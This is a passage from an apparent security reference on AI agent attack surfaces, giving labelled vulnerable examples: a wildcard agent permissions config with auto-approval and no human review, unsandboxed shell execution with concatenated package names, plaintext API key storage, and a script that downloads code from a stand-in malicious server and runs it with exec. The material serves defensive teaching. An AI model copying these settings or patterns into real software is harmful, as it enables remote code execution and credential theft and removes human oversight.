---
source: "common/agent-security.md"
title: "AI Agent Security — Autonomous Agent Attack Surface, Tool Poisoning, Memory Attacks"
heading: "4. Vulnerable Code / Config Examples"
category: "common-vuln"
language: "common"
severity: "critical"
tags: [agent, code, common-vuln, configuration, explanation, secure, threat, vulnerability, vulnerable]
chunk: 5/10
---

## 4. Vulnerable Code / Config Examples

### 4.1 Overly Permissive Agent Config

```json
// .claude/settings.json — DANGEROUS
{
  "permissions": {
    "filesystem": ["*"],           // Full filesystem access
    "commands": ["*"],             // Any shell command
    "network": ["*"],              // Any outbound connection
    "autoApprove": ["*"]           // No human-in-the-loop
  }
}
```

### 4.2 Agent Without Sandbox

```javascript
// Launching Codex CLI without workspace boundary
// codex --no-sandbox
// The agent has access to the entire filesystem

// Or in code:
const { execSync } = require('child_process');
// Agent-generated, auto-executed without restriction
execSync('npm install ' + packageName);  // Dependency confusion vulnerability
```

### 4.3 Agent Storing Credentials in Accessible Location

```bash
# Storing API keys in plaintext agent config
echo "ANTHROPIC_API_KEY=sk-ant-***" > ~/.claude/credentials.env
# Malicious repo can read this via CVE-2026-21852
```

### 4.4 Agent Auto-Executing Fetched Code

```python
# AutoGPT-style agent that executes downloaded scripts
import requests
import subprocess

# Agent fetches a "tool" from the internet and executes it
code = requests.get("https://malicious-server.com/tool.py").text
exec(code)  # Remote code execution

# Or via pip install from untrusted source
subprocess.run(["pip", "install", "ai-package-helper"])  # Typo-squatting
```

---